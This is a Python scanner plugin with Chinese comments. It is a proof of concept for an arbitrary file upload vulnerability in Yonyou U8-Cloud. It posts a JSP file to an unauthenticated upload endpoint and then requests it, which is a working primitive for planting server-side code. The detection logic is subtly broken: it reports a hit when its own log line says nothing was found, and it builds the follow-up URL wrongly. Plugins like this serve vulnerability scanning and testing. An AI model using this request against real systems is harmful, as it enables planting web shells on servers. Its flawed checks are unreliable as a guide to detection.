# app="用友-U8-Cloud"
# 导入必要的模块
from xing.core.BasePlugin import BasePlugin  # 导入BasePlugin类，用于创建插件基类
from xing.utils import http_req  # 导入http_req函数，用于发送HTTP请求
from xing.core import PluginType, SchemeType  # 导入PluginType和SchemeType枚举，用于指定插件类型和协议类型


# 定义Plugin类，继承自BasePlugin
class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()  # 调用父类的构造函数
        self.plugin_type = PluginType.POC  # 将插件类型设置为POC（Proof of Concept，概念验证）
        self.vul_name = "用友-U8-Cloud-任意文件上传"  # 定义漏洞名称
        self.app_name = 'U8'  # 将应用程序名称定义为 U8
        self.scheme = [SchemeType.HTTP]  # 指定支持的协议类型和HTTP

    # 定义用于检测漏洞的verify方法
    def verify(self, target):
        path = ["/linux/pages/upload.jsp"]  # 定义待检测的路径列表
        url = target + path[0]  # 构建完整的URL

        # 设置请求头
        header = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
            "Accept-Encoding": "gzip, deflate",
            "Accept": "*/*",
            "Connection": "close",
            "Content-Type": "application/x-www-form-urlencoded",
            "filename": "55051.jsp",
            "Content-Length": "30"
        }

        # 发送POST请求并获取响应
        data = '<% out.println(\"Console\"); %>'  # POST请求的数据

        # conn = requests.post(url, data=data, headers=header)
        conn = http_req(url, method='post', data=data, headers=header)

        content = conn.content  # 获取返回的内容

        # 发送GET请求并获取状态码
        conn1 = http_req(url + '/linux/55051.jsp')

        if conn.status_code != 404:  # 如果状态码不是404

            if (
                    b"<title>This page for response" not in content and b"upload success" not in content):  # 如果返回的内容不包含"<title>This page for response"或者"success file"

                self.logger.success("not found U8-Cloud-upload file")  # 打印调试信息

                return url

            if (b"<title>This page for response" in content or b"upload success" in content) or (
                    conn1.status_code == 200):  # 如果返回的内容包含指定的字符串

                self.logger.success("用友U8-Cloud-upload {}".format(target + '/linux/55051.jsp'))  # 打印成功信息

                return target + '/linux/55051.jsp'
                # return必须写,作为风险巡航-漏扫-凭证会用到
